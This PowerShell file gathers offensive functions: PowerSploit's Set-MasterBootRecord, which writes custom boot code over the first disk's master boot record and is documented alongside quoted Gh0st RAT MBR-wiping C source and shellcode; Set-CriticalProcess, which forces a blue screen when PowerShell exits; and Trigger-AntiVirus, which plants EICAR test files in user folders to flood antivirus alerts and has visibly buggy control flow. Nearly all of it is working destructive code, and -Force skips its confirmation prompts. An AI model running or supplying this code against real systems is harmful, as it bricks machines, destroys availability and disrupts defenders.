function Set-MasterBootRecord
{
<#
.SYNOPSIS

Proof of concept code that overwrites the master boot record with the
message of your choice.

PowerSploit Function: Set-MasterBootRecord  
Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.DESCRIPTION

Set-MasterBootRecord is proof of concept code designed to show that it is
possible with PowerShell to overwrite the MBR. This technique was taken
from a public malware sample. This script is inteded solely as proof of
concept code.

.PARAMETER BootMessage

Specifies the message that will be displayed upon making your computer a brick.

.PARAMETER RebootImmediately

Reboot the machine immediately upon overwriting the MBR.

.PARAMETER Force

Suppress the warning prompt.

.EXAMPLE

Set-MasterBootRecord -BootMessage 'This is what happens when you fail to defend your network. #CCDC'

.NOTES

Obviously, this will only work if you have a master boot record to
overwrite. This won't work if you have a GPT (GUID partition table).

This code was inspired by the Gh0st RAT source code seen here (acquired from: http://webcache.googleusercontent.com/search?q=cache:60uUuXfQF6oJ:read.pudn.com/downloads116/sourcecode/hack/trojan/494574/gh0st3.6_%25E6%25BA%2590%25E4%25BB%25A3%25E7%25A0%2581/gh0st/gh0st.cpp__.htm+&cd=3&hl=en&ct=clnk&gl=us):

// CGh0stApp message handlers

unsigned char scode[] =
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c"
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72"
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29";

int CGh0stApp::KillMBR()
{
	HANDLE hDevice;
	DWORD dwBytesWritten, dwBytesReturned;
	BYTE pMBR[512] = {0};

	// ????MBR
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;

	hDevice = CreateFile
		(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
		);
	if (hDevice == INVALID_HANDLE_VALUE)
		return -1;
	DeviceIoControl
		(
		hDevice,
		FSCTL_LOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NUL
		)
	// ??????
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL);
	DeviceIoControl
		(
		hDevice,
		FSCTL_UNLOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwBytesReturned,
		NULL
		);
	CloseHandle(hDevice);

	ExitProcess(-1);
	return 0;
}
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
    Param (
        [ValidateLength(1, 479)]
        [String]
        $BootMessage = 'Stop-Crying; Get-NewHardDrive',

        [Switch]
        $RebootImmediately,

        [Switch]
        $Force
    )

    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {
        throw 'This script must be executed from an elevated command prompt.'
    }

    if (!$Force)
    {
        if (!$psCmdlet.ShouldContinue('Do you want to continue?','Set-MasterBootRecord prevent your machine from booting.'))
        {
            return
        }
    }

    #region define P/Invoke types dynamically
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))

    # Define [Win32.Kernel32]::DeviceIoControl
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeviceIoControl',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CreateFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [IntPtr],
        [Type[]]@([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::WriteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('WriteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CloseHandle
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CloseHandle',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $Kernel32 = $TypeBuilder.CreateType()
    #endregion

    $LengthBytes = [BitConverter]::GetBytes(([Int16] ($BootMessage.Length + 5)))
    # Convert the boot message to a byte array
    $MessageBytes = [Text.Encoding]::ASCII.GetBytes(('PS > ' + $BootMessage))

    [Byte[]] $MBRInfectionCode = @(
        0xb8, 0x12, 0x00,         # MOV  AX, 0x0012 ; CMD: Set video mode, ARG: text resolution 80x30, pixel resolution 640x480, colors 16/256K, VGA
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set video mode
        0xb8, 0x00, 0x0B,         # MOV  AX, 0x0B00 ; CMD: Set background color
        0xbb, 0x01, 0x00,         # MOV  BX, 0x000F ; Background color: Blue
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set background color
        0xbd, 0x20, 0x7c,         # MOV  BP, 0x7C18 ; Offset to string: 0x7C00 (base of MBR code) + 0x20
        0xb9) + $LengthBytes + @( # MOV  CX, 0x0018 ; String length
        0xb8, 0x01, 0x13,         # MOV  AX, 0x1301 ; CMD: Write string, ARG: Assign BL attribute (color) to all characters
        0xbb, 0x0f, 0x00,         # MOV  BX, 0x000F ; Page Num: 0, Color: White
        0xba, 0x00, 0x00,         # MOV  DX, 0x0000 ; Row: 0, Column: 0
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Write string
        0xe2, 0xfe                # LOOP 0x16       ; Print all characters to the buffer
        ) + $MessageBytes

    $MBRSize = [UInt32] 512

    if ($MBRInfectionCode.Length -gt ($MBRSize - 2))
    {
        throw "The size of the MBR infection code cannot exceed $($MBRSize - 2) bytes."
    }

    # Allocate 512 bytes for the MBR
    $MBRBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($MBRSize)

    # Zero-initialize the allocated unmanaged memory
    0..511 | ForEach-Object { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }

    [Runtime.InteropServices.Marshal]::Copy($MBRInfectionCode, 0, $MBRBytes, $MBRInfectionCode.Length)

    # Write boot record signature to the end of the MBR
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 2)), 0x55)
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 1)), 0xAA)

    # Get the device ID of the boot disk
    $DeviceID = Get-WmiObject -Class Win32_DiskDrive -Filter 'Index = 0' | Select-Object -ExpandProperty DeviceID

    $GENERIC_READWRITE = 0x80000000 -bor 0x40000000
    $FILE_SHARE_READWRITE = 2 -bor 1
    $OPEN_EXISTING = 3

    # Obtain a read handle to the raw disk
    $DriveHandle = $Kernel32::CreateFile($DeviceID, $GENERIC_READWRITE, $FILE_SHARE_READWRITE, 0, $OPEN_EXISTING, 0, 0)

    if ($DriveHandle -eq ([IntPtr] 0xFFFFFFFF))
    {
        throw "Unable to obtain read/write handle to $DeviceID"
    }

    $BytesReturned = [UInt32] 0
    $BytesWritten =  [UInt32] 0
    $FSCTL_LOCK_VOLUME =   0x00090018
    $FSCTL_UNLOCK_VOLUME = 0x0009001C

    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_LOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::WriteFile($DriveHandle, $MBRBytes, $MBRSize, [Ref] $BytesWritten, 0)
    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_UNLOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::CloseHandle($DriveHandle)

    Start-Sleep -Seconds 2

    [Runtime.InteropServices.Marshal]::FreeHGlobal($MBRBytes)

    Write-Verbose 'Master boot record overwritten successfully.'

    if ($RebootImmediately)
    {
        Restart-Computer -Force
    }
}

function Set-CriticalProcess
{
<#
.SYNOPSIS

Causes your machine to blue screen upon exiting PowerShell.

PowerSploit Function: Set-CriticalProcess  
Author: Matthew Graeber (@mattifestation)  
License: BSD 3-Clause  
Required Dependencies: None  
Optional Dependencies: None  

.PARAMETER ExitImmediately

Immediately exit PowerShell after successfully marking the process as critical.

.PARAMETER Force

Set the running PowerShell process as critical without asking for confirmation.

.EXAMPLE

Set-CriticalProcess

.EXAMPLE

Set-CriticalProcess -ExitImmediately

.EXAMPLE

Set-CriticalProcess -Force -Verbose

#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')]
    Param (
        [Switch]
        $Force,

        [Switch]
        $ExitImmediately
    )

    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
    {
        throw 'You must run Set-CriticalProcess from an elevated PowerShell prompt.'
    }

    $Response = $True

    if (!$Force)
    {
        $Response = $psCmdlet.ShouldContinue('Have you saved all your work?', 'The machine will blue screen when you exit PowerShell.')
    }

    if (!$Response)
    {
        return
    }

    $DynAssembly = New-Object System.Reflection.AssemblyName('BlueScreen')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('BlueScreen', $False)

    # Define [ntdll]::NtQuerySystemInformation method
    $TypeBuilder = $ModuleBuilder.DefineType('BlueScreen.Win32.ntdll', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('NtSetInformationProcess',
                                                        'ntdll.dll',
                                                        ([Reflection.MethodAttributes] 'Public, Static'),
                                                        [Reflection.CallingConventions]::Standard,
                                                        [Int32],
                                                        [Type[]] @([IntPtr], [UInt32], [IntPtr].MakeByRefType(), [UInt32]),
                                                        [Runtime.InteropServices.CallingConvention]::Winapi,
                                                        [Runtime.InteropServices.CharSet]::Auto)

    $ntdll = $TypeBuilder.CreateType()

    $ProcHandle = [Diagnostics.Process]::GetCurrentProcess().Handle
    $ReturnPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)

    $ProcessBreakOnTermination = 29
    $SizeUInt32 = 4

    try
    {
        $null = $ntdll::NtSetInformationProcess($ProcHandle, $ProcessBreakOnTermination, [Ref] $ReturnPtr, $SizeUInt32)
    }
    catch
    {
        return
    }

    Write-Verbose 'PowerShell is now marked as a critical process and will blue screen the machine upon exiting the process.'

    if ($ExitImmediately)
    {
        Stop-Process -Id $PID
    }
}
function Trigger-AntiVirus{

    <#
        .SYNOPSIS
        Function used to trigger an antivirus alert.

        .DESCRIPTION
        Expirimental function that triggers an antivirus reaction using the 'EICAR test string'. Can be used for social engineering. Most commonly used as a tool to slow the reaction time of antivirus applications.

        .PARAMETER Clean
        You should always clean up your messes, this is a default. Some antivirus may auto clean anyway, but again...no messes.

        .PARAMETER Common
        A switch to specify the use of common infection points as a place to inject the test string.

        .PARAMETER Limit
        An integer used to specify the maximum number of injections
    
        .PARAMETER Min
        An integer used to specify the smallest number of seconds to wait between injections.

        .PARAMETER Max
        An integer used to specify the largest number of seconds to wait between injections.

        .PARAMETER Path
        A string specifying a directory to inject the test string to.

        .CREDITS
        LogoiLab (Chad Baxter)

        .LINK
        https://www.github.com/LogoiLab/AV-Stresser

    #>

    $ErrorActionPreference = "Continue"

    param(
        [Parameter(Mandatory=$False,Position=0)]
        [switch]$Clean,
        [Parameter(Mandatory=$False,Position=1)]
        [switch]$Common,
        [Parameter(Mandatory=$False,Position=2)]
        [int]$Limit,
        [Parameter(Mandatory=$True,Position=3)]
        [int]$Max,
        [Parameter(Mandatory=$True,Position=4)]
        [int]$Min,
        [Parameter(Mandatory=$False,Position=5)]
        [string]$Path
    )

    #Set up common paths.
    $commonpaths = "$env:APPDATA", "$env:TEMP", "$env:HOMEPATH"
    
    #EICAR string stored as base64...why?.. because if it is plain text AV will trigger on this line.
    $base64 = 'WAA1AE8AIQBQACUAQABBAFAAWwA0AFwAUABaAFgANQA0ACgAUABeACkANwBDAEMAKQA3AH0AJABFAEkAQwBBAFIALQBTAFQAQQBOAEQAQQBSAEQALQBBAE4AVABJAFYASQBSAFUAUwAtAFQARQBTAFQALQBGAEkATABFACEAJABIACsASAAqAA=='
    
    #Load EICAR string to memory.
    $eicar = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64));

    #Default Clean parameter to true.{
    if($Clean -eq $null){
        $Clean = $true
    }
    #}

    #Default Limit parameter to 1. If Limit is 0 throw error.{
    if($Limit -eq $null){
        $Limit = 1
    }
    if($Limit -eq 0){
        throw "Limit cannot be zero!"
        exit
    }
    #}

    #Make sure either Path or Common are specified.
    if($Path -eq $null -and ($Common -eq $false -or $Common -eq $null)){
        throw "Please use common paths, or specify a path!"
        exit
    }

    #If the user chooses common paths, use them
    if($Common){
        if($Path -ne $null){
            if(Test-Path $Path){
                $commonpaths += $Path
                $i = 0
                while($i -lt $Limit){
                    foreach($place in $commonpaths){
                        Start-Sleep (Get-Random -Maximum $Max -Minimum $Min)
                        if($i -gt 0 -and $Clean -eq $true){
                            Remove-Item -Path "$place\$name.tmp" -Force | Out-Null
                        }
                        $name = New-Random
                        New-Item -Path "$place\$name.tmp" -ItemType File -Force
                        Set-Content -Path "$place\$name.tmp" -Value $eicar -Force
                    }
                }
            }
            else{
                throw "$Path is not a valid path!"
                $i = 0
                while($i -lt $Limit){
                    foreach($place in $commonpaths){
                        Start-Sleep (Get-Random -Maximum $Max -Minimum $Min)
                        if($i -gt 0 -and $Clean -eq $true){
                            Remove-Item -Path "$place\$name.tmp" -Force | Out-Null
                        }
                        $name = New-Random
                        New-Item -Path "$place\$name.tmp" -ItemType File -Force
                        Set-Content -Path "$place\$name.tmp" -Value $eicar -Force
                    }
                }
            }
        }
        else{
            $i = 0
            while($i -lt $Limit){
                foreach($place in $commonpaths){
                    if($i -gt 0 -and $Clean -eq $true){
                        Remove-Item -Path "$place\$name.tmp" -Force | Out-Null
                    }
                    Start-Sleep (Get-Random -Maximum $Max -Minimum $Min)
                    $name = New-Random
                    New-Item -Path "$place\$name.tmp" -ItemType File -Force
                    Set-Content -Path "$place\$name.tmp" -Value $eicar -Force
                }
            }
        }
    }
    #If the user doesn't choose common paths, use the path specified.
    else{
        if(Test-Path $Path){
            while($i -lt $Limit){
                        Start-Sleep (Get-Random -Maximum $Max -Minimum $Min)
                        if($i -gt 0 -and $Clean -eq $true){
                            Remove-Item -Path "$Path\$name.tmp" -Force | Out-Null
                        }
                        $name = New-Random
                        New-Item -Path "$Path\$name.tmp" -ItemType File -Force
                        Set-Content -Path "$Path\$name.tmp" -Value $eicar -Force
            }
        }
        else{
            throw "$Path is not a valid path!"
    }
}
}
